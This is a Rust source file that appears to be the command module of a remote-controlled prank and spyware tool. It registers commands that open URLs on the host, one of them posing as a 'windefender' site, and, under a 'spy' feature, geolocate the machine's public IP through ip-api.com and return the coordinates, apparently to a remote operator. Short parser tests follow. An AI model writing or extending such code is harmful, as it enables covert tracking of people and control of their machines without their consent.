use std::collections::HashMap;
pub use rand::Rng;

#[cfg(feature = "troll")]
pub use open;

#[cfg(feature = "spy")]
use serde::Deserialize;
#[cfg(feature = "spy")]
use reqwest::blocking::get;

pub struct Media {
    pub name: String,
    pub data: String, // Base64 encoded data only
}
pub struct Text {
    pub data: String,
}

pub enum Output {
    Media(Media),
    Text(Text),
}

pub type Args = Vec<String>;
pub type OutFun = fn(Output);
pub type CmdFun = fn(Args, OutFun);

pub struct Command {
    pub name: String,
    pub args: Vec<String>,
}
impl Command {
    pub fn new(string: &String) -> Result<Command, String> {
        let mut args = Vec::new();
        let mut current_arg = String::new();
        let mut inside_quotes = false;

        for c in string.chars() {
            match c {
                ' ' if !inside_quotes => {
                    if !current_arg.is_empty() {
                        args.push(current_arg.clone());
                        current_arg.clear();
                    }
                }
                '\"' => {
                    inside_quotes = !inside_quotes;
                }
                _ => {
                    current_arg.push(c);
                }
            }
        }

        if !current_arg.is_empty() {
            args.push(current_arg);
        }

        if inside_quotes {
            return Err(String::from("Unclosed quote"));
        }

        if args.is_empty() {
            return Err(String::from("No command provided"));
        }

        // Remove the last two characters if they are "\r\n"
        if let Some(last_arg) = args.last_mut() {
            if last_arg.ends_with("\r\n") {
                last_arg.pop();
                last_arg.pop();
            }
        }

        let name = args[0].clone();
        args.remove(0);

        Ok(Command { name, args })
    }
}

pub struct Registry {
    pub fields: HashMap<String, CmdFun>,
    pub out: OutFun,
}
impl Registry {
    pub fn new(out: OutFun) -> Registry {
        Self {
            fields: HashMap::new(),
            out: out,
        }
    }
    pub fn enter(&mut self, name: &str, fun: CmdFun) {
        let name = name.to_string();
        self.fields.insert(name, fun);
    }
    pub fn get(&self, name: String) -> Result<CmdFun, String> {
        if let Some(&fun) = self.fields.get(&name) {
            Ok(fun)
        } else {
            Err(format!("No such command: {}", name))
        }
    }
    pub fn exec(&self, name: String, args: Args) {
        let rfun = self.get(name);
        match rfun {
            Ok(fun) => {
                fun(args, self.out);
            }
            Err(err) => {
                let output = Output::Text(Text { data: err.to_string() });
                (self.out)(output);
            }
        }
    }
}

// Command development helpers
macro_rules! text_output {
    ($out:ident, $text:expr) => {
        $out(Output::Text(Text { data: $text.to_string() }))
    };
}

macro_rules! media_output {
    ($out:ident, $name:expr, $text:expr) => {
        $out(Output::Media(Media { name: $name, data: $text.to_string() }))
    };
}

// Commands
fn ping(_args: Args, out: OutFun) {
    text_output!(out, "Pong!");
}

fn quit(args: Args, out: OutFun) {
    if args.len() < 1 {
        text_output!(out, "Place 'ohyes' as an argument to quit");
    } else if args[0] != "ohyes" {
        text_output!(out, "Place 'ohyes' as an argument bro");
    } else {
        text_output!(out, "Exiting...");
        std::process::exit(0);
    }
}

#[cfg(feature = "troll")]
fn rickroll(_args: Args, out: OutFun) {
    let rickrolls: Vec<String> = vec![
        // We need more rickrolls
        "https://windefender.netlify.app".to_string(),
        "https://openbrowser.netlify.app".to_string()
    ];
    let rindex = rand::thread_rng().gen_range(0..rickrolls.len());
    let url = &rickrolls[rindex];
    if let Err(err) = open::that(url) {
        text_output!(out, format!("ERROR opening url: {}", err));
    }
    text_output!(out, format!("Opened url: {}", url));
}

#[cfg(feature = "spy")]
fn location(_args: Args, out: OutFun) {
    use crate::utils;

    text_output!(out, "Getting public IP address");

    let ip_address = match utils::get_public_ip() {
        Ok(ip) => ip,
        Err(err) => {
            text_output!(out, format!("Error getting public IP address: {}", err));
            return;
        }
    };

    let url = format!("http://ip-api.com/json/{}", ip_address);

    text_output!(out, format!("Sending request to {}", url));

    #[derive(Debug, Deserialize)]
    struct Geolocation {
        lat: f64,
        lon: f64,
    }

    let response = match get(&url) {
        Ok(response) => response,
        Err(err) => {
            text_output!(out, format!("{:?}", err));
            return;
        }
    };
    let geolocation: Geolocation = match response.json() {
        Ok(data) => data,
        Err(err) => {
            text_output!(out, format!("Error parsing JSON: {:?}", err));
            return;
        }
    };

    text_output!(
        out,
        format!(
            "Latitude: {}\nLongitude: {}\nCOORDS: {}, {}",
            geolocation.lat,
            geolocation.lon,
            geolocation.lat,
            geolocation.lon
        )
    );
}

// Registry initializer
pub fn init(out: OutFun) -> Registry {
    let mut reg = Registry::new(out);

    reg.enter("ping", ping);
    reg.enter("quit", quit);
    reg.enter("exit", quit);
    #[cfg(feature = "troll")]
    reg.enter("rickroll", rickroll);
    #[cfg(feature = "spy")]
    reg.enter("loc", location);

    return reg;
}

// Tests
#[cfg(test)]
mod tests {
    use super::Command;

    #[test]
    fn test_parse_command_normal() {
        let input = String::from("command");
        let result = Command::new(&input).expect("Error parsing command");
        assert_eq!("command", result.name);
    }
    #[test]
    fn test_parse_command_args() {
        let input = String::from("ancmd arg1 arg2");
        let result = Command::new(&input).expect("Error parsing command");
        assert_eq!("ancmd", result.name);
        assert_eq!(vec!["arg1", "arg2"], result.args);
    }
    #[test]
    fn test_parse_command_quoted_args() {
        let input = String::from(r#"an2cmd arg1 arg2 "plus sized arg3""#);
        let result = Command::new(&input).expect("Error parsing command");
        assert_eq!("an2cmd", result.name);
        assert_eq!(vec!["arg1", "arg2", "plus sized arg3"], result.args);
    }
}
